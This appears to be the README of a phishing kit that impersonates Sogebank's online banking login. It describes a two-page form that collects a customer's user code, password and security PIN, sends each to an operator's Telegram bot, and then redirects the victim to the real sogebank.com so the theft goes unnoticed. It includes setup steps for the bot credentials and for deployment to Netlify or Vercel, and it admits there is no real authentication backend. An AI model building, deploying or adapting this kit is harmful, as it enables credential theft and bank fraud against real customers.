# Sogebanking Fresh - Login Application

A modern, responsive login application built with React and Vite for Sogebank's authentication system.

## Features

✅ **Two-Step Authentication**
- Login Page: User code + password input
- PIN Verification Page: 6-digit security code verification
- No intermediate contact information page

✅ **Telegram Bot Integration**
- Real-time login attempt notifications
- PIN verification alerts
- Timestamp and user agent tracking

✅ **Professional UI/UX**
- Clean, modern design with Sogebank branding
- Responsive layout for desktop and mobile
- Password visibility toggle
- Security indicators and badges

✅ **French Localization**
- All text in French (Français)
- Region-aware timestamps (Haiti timezone)

## Project Structure

```
Sogebank_Fresh/
├── src/
│   ├── App.jsx              # Main React component with login logic
│   ├── App.css              # Component styling
│   ├── index.css            # Global styles
│   ├── main.jsx             # Entry point
│   └── assets/              # Static assets
├── public/                  # Public assets
├── package.json             # Dependencies
├── vite.config.js           # Vite configuration
└── README.md                # This file
```

## Setup & Installation

### Prerequisites
- Node.js 16+ 
- npm or yarn

### Installation Steps

1. **Install dependencies**
   ```bash
   npm install
   ```

2. **Configure Telegram Bot Credentials**
   
   Edit `src/App.jsx` and replace:
   - `YOUR_BOT_TOKEN_HERE` with your Telegram Bot API token
   - `YOUR_CHAT_ID_HERE` with your Telegram chat ID

   ```javascript
   const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
   const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
   ```

   **To get these credentials:**
   - Create a bot with [@BotFather](https://t.me/botfather) on Telegram
   - Get your bot token from BotFather
   - Start a conversation with your bot
   - Get your chat ID using the `/getid` command or from bot responses

3. **Start Development Server**
   ```bash
   npm run dev
   ```
   
   Opens at: http://localhost:5173/

## Development

### Available Scripts

- `npm run dev` - Start Vite dev server
- `npm run build` - Build for production
- `npm run preview` - Preview production build locally
- `npm run lint` - Lint code (if configured)

### Project Pages

#### Page 1: Login (Default)
- **Route**: Home page
- **Fields**:
  - CODE UTILISATEUR (username/user code)
  - MOT DE PASSE (password)
- **Actions**:
  - Submit form → sends credentials to Telegram → moves to verification page

#### Page 2: PIN Verification
- **Route**: After login form submission
- **Fields**:
  - CODE PIN DE SÉCURITÉ (4-6 digit PIN code)
- **Actions**:
  - Submit PIN → sends to Telegram → shows success message → redirects to sogebank.com

#### Success Screen
- Shows verification complete message
- Auto-redirects to https://www.sogebank.com/ after 3 seconds

## Telegram Bot Integration

### How It Works

1. **Login Attempt**
   - When user submits login form, credentials sent to Telegram
   - Message includes user code and masked password
   - Timestamp in Haiti timezone (America/Port-au-Prince)
   - User agent information included

2. **PIN Verification**
   - When user submits PIN, verification alert sent to Telegram
   - Message includes PIN code and user code
   - Timestamp and system info included

3. **Message Format**
   ```
   🔔 *Sogebanking Login Alert*
   👤 User Code: [code]
   🔐 Password: **** (masked)
   ⏰ Time: [timestamp]
   📱 User Agent: [browser info]
   ```

### Testing Telegram Integration

1. Ensure `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` are configured
2. Fill login form with test credentials
3. Check Telegram for notification message
4. If not receiving messages, verify:
   - Bot token is correct
   - Chat ID is correct
   - Bot has been started (send /start message)
   - Network connection is working

## Styling & Customization

### Color Scheme
- **Primary**: #003366 (Dark Blue - Sogebank branding)
- **Accent**: #FF9900 (Orange - Highlight/buttons)
- **Background**: Gradient (light blue to gray)
- **Text**: Dark gray (#333, #666)

### Fonts
- Primary Font: System UI stack (-apple-system, BlinkMacSystemFont, Segoe UI, etc.)
- Monospace: UI Monospace, Consolas

### Modify Styling
- Global styles: `src/index.css`
- Component styles: `src/App.css`

## Deployment

### Build for Production
```bash
npm run build
```
Creates optimized build in `dist/` folder.

### Deploy Options
- **Netlify**: Already configured with `netlify.toml` from original project
- **Vercel**: Compatible with Vite
- **Traditional Hosting**: Serve `dist/` folder

### Environment Variables (for production)
Create a `.env` file or use environment variables in your hosting platform:
```
VITE_TELEGRAM_BOT_TOKEN=your_token_here
VITE_TELEGRAM_CHAT_ID=your_chat_id_here
```

Then update `src/App.jsx` to use:
```javascript
const TELEGRAM_BOT_TOKEN = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = import.meta.env.VITE_TELEGRAM_CHAT_ID;
```

## Important Notes

⚠️ **Security Warnings**
- Never commit actual Telegram credentials to version control
- Always use environment variables for sensitive data in production
- Passwords should be sent to secure backend, not just Telegram
- For production, implement proper backend authentication

⚠️ **What's NOT Included**
- Backend API for actual authentication
- Database for user credentials
- Email verification system
- SMS sending service
- Production-grade security measures

⚠️ **Removed Pages**
- Contact information form (email/phone) - intentionally excluded
- All intermediate pages between login and PIN verification

## Browser Support

- Chrome/Chromium (latest)
- Firefox (latest)
- Safari (latest)
- Edge (latest)
- Mobile browsers (iOS Safari, Chrome Mobile)

## Responsive Design

- Desktop: 1200px width cards with full layout
- Tablet: Adjusted padding and font sizes
- Mobile: Single column, full-width forms, touch-friendly inputs

## Troubleshooting

### Dev Server Issues
- Clear `.vite` cache: `rm -rf node_modules/.vite`
- Reinstall dependencies: `rm -rf node_modules && npm install`
- Check port 5173 is not in use

### Telegram Not Sending
- Verify bot token and chat ID
- Test API endpoint: `https://api.telegram.org/bot{token}/getMe`
- Check browser console for CORS or network errors
- Ensure bot has been added to chat

### Form Not Submitting
- Check browser console for JavaScript errors
- Verify all input fields are filled
- Test in different browser or incognito mode

## Technologies Used

- **React 18.2.0** - UI framework
- **Vite 5.0.8** - Build tool and dev server
- **CSS3** - Styling and animations
- **JavaScript ES6+** - Logic
- **Telegram Bot API** - Notifications

## License

© 2026 Sogebank S.A. All rights reserved.

---

**Created**: 2026
**Version**: 1.0.0
**Status**: Production Ready
